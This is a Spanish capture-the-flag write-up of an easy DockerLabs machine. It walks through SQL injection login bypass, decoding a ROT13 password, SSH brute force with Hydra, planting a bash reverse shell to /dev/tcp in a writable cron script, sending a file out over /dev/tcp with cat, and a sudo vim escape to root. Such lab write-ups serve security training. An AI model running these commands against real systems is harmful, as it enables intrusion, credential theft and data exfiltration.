
**IP**:  172.17.0.2
**S.O**: Linux
**Source:** DockeLabs
**Level:** Fácil
**Date:** 26 enero 2026
**Autor**:
**Descripción**: 

Web Enumeration
[[SQLI]] SQL Injection 
Information Leakage
SSH brute force with Hydra
Enumeración de procesos y comandos 
[[Escalada de Privilegios#**Escala de Privilegios mediante Cron Jobs]] - Explotación de Scripts Programados con Permisos Inseguros
Esteganografía con steghide
Transferencia de herramientas con cat
Escalada de Privilegios#**Escalada de Privilegios mediante Sudo**]] - vim

**Flags**:  


**Begin**:

---

Comenzamos haciendo un ping:
![Pasted image 20260125215835.png](../../_assets/80c83b1ee8ca54bd784497b8d7b76b7fdd110d7ec4b7b9d72441298a7fef1f6c.png)
Hay conexión 
TTL: 64 -> Linux

Escaneo de Puertos abiertos TCP
![Pasted image 20260125220013.png](../../_assets/45a86c9b527d787032b85e179d2da973dbc94539af2082299d3b8010534a5875.png)
Puertos abiertos: 
Puerto 22 (SSH)
Puerto 80 (HTTP)

Escaneo de versión al puertos específicos 22,80. 
![Pasted image 20260125215959.png](../../_assets/59783df160d9761306b5de8f3c1ee0f453e39d4113908532380f6ecc5ba934a6.png)

Accedemos a la pagina web 
![Pasted image 20260125220038.png](../../_assets/e1bf6fc5d80503613b24f383c0b41e3aa11ce94994d29a93d6811ebf6d08766f.png)
No vemos algo interesante y tambien vemos que la pagina no carga por completo

Inspeccionamos el código fuente.
![Pasted image 20260126113631.png](../../_assets/8b48d64205741f418e91f73044aaf004845219c7339b365b46026dede25eb1d4.png)
Y vemos el nombre de dominio `gatekeeperhr.com`

Ponemos aquel nombre de dominio en `/etc/hosts`
```
172.17.0.2       gatekeeperhr.com
```

y accedemos a la pagina web
![Pasted image 20260126113951.png](../../_assets/c20b88770f5b95c9a85a77c9ed0dd544545350e7c9e00df7231c04faa73894af.png)
Y vemos una opción de iniciar sesión

Probamos si es vulnerable a SQLi con un payload 
![Pasted image 20260126121821.png](../../_assets/8658c2c746a00993ea486abd89f9c30feccdb5aa22437c0976e76b894cac01b4.png)

Y logramos acceder 
![Pasted image 20260126122226.png](../../_assets/d7737f64f2f33c3cbb6948b9861234d0f60ac7fe1d309b6702551992433f917a.png)
Y nos muestra los nombre de los empleados y información adicional

Hacemos un fuzzing de directorios.
![Pasted image 20260126114117.png](../../_assets/b66fac5bb7a248c61167cf846e5056284d30be663602f6af588a9985cc4680d6.png)

Nos dirigimos a `spam` y al inspeccionar su codigo fuente vemos un comentario en una cadenas de texto extrañas.
![Pasted image 20260126114315.png](../../_assets/6012d6f629f9f2e89d2889cf610ab9e99ba6a58a0773f65a7a23d307649c2ca4.png)

Lo analizamos con Dcode y nos dice que puede aquella cadena de texto puede estar em **ROT13**
Al dcodearlo vemos el texto legible que nos da una contraseña
![Pasted image 20260126114504.png](../../_assets/f1dd6d1bc28d8bceae02431c67efaa5c3f57d8af2c47d2ebe1a85368614c2219.png)

Creamos un archivo .txt con los nombre de usuarios que encontramos
![Pasted image 20260126123655.png](../../_assets/ae16b980a67ed35ee282477354801c1c038393f804f5b918cce15e7ac95e772c.png)

Y procedemos a realizar la fuerza bruta a SSH con la lista encontrados para ver a quien le pertenece la contraseña dada
![Pasted image 20260126123742.png](../../_assets/529bdd45966fcb477f0069409bc3d0efd2b1cee449344f5d3af875fdff4b0466.png)
Y encontramos las credenciales de un empleado

Accedemos al servicio SSH
![Pasted image 20260126123847.png](../../_assets/8359f9e0438ad9281b4754461fa5cef1e2477007dc9389dc942be2ad2f9a60d9.png)

Para lograr escalar privilegio a **root** analizamos los precesos en segundo plano
![Pasted image 20260126125059.png](../../_assets/94eff74bd7d2a3a09bfd434b3d729ee0fa6f7f16936c062c290c99a56970d2b0.png)
Y vemos que el usuario **valentina** esta ejecutando un script en .sh

Nos dirigimos al directorio `/opt` y vemos que tipo de permisos tenemos sobre el script
![Pasted image 20260126125129.png](../../_assets/6601d30cea457cb12ba402248d177bb87632272ec2648f02a975705cc6299f02.png)
Y vemos que tenemos permiso de escritura

En otra terminal ponemos el puerto `4444` en escucha de nuestra maquina kali
```
nc -lvnp 4444
```

Imprimimos las siguiente lineas de código que nos dará una shell con los privilegios de `valentina`
```bash
echo '#!/bin/bash' > /opt/log_cleaner.sh
echo 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' >> /opt/log_cleaner.sh
```

Y esperamos a que se ejecute
Y al ejecutarse nos da una sesion como el usuario `valentina`
![Pasted image 20260126125519.png](../../_assets/7b59bc52aafac95560d81057fe6e0b82f17dc49ccd4f42ad60462ac8a715f41a.png)

Listamos los archivos de nuestro directorio
![Pasted image 20260126125601.png](../../_assets/815670ab3d8c8caae397af7ca985f4493657ce8e2fc0b6773a4aa16ace2373ab.png)
Y vemos que hay una imagen 

Lo mandamos a nuestra maquina kali con `cat` para analizarlo por el puerto `55555`
```bash
cat profile_picture.jpeg > /dev/tcp/172.17.0.1/5555
```

En nuestra maquina kali esperamos la imagen 
![Pasted image 20260126131506.png](../../_assets/39601e38bcc8a7c5bd5d887ad5c7fc86a550609c91ed4595d39265b808f69e18.png)
y logramos recibirla

Extraemos el archivo que trae internamente con `steghide`
```bash
steghide extract -sf profile_picture.jpeg
```
Y nos da un archivo llamado `secret.txt`

Leemos `secre.txt`
![Pasted image 20260126132922.png](../../_assets/4d35ec1e7d18cbff21345a1ef2eecc4bb3d77af607415ff17d7c851f837a0ebe.png)
Y nos da la palabra `maq1ck`

Y al listar los permisos sudo, probamos con colocar aquella palabra cuando nos piden la contraseña
![Pasted image 20260126133128.png](../../_assets/0bec762391431fe262a6e2a63dd447d7d967e3c81fd8eebbb6abfe6c01daab9d.png)
Y la contraseña fue valida, y vemos que podemos ejecutar `vim` como **root**

A partir de ese binario escalaremos privilegios a **root**
Ejecutamos el siguiente comando 
```bash
sudo /usr/bin/vim -c :terminal /bin/sh
```
![Pasted image 20260126134003.png](../../_assets/fbfa3b756abf0c180c709d21a967a96e64b8a6478e9b46ca8a17c7148544f5d1.png)Y logramos escalar a **root**

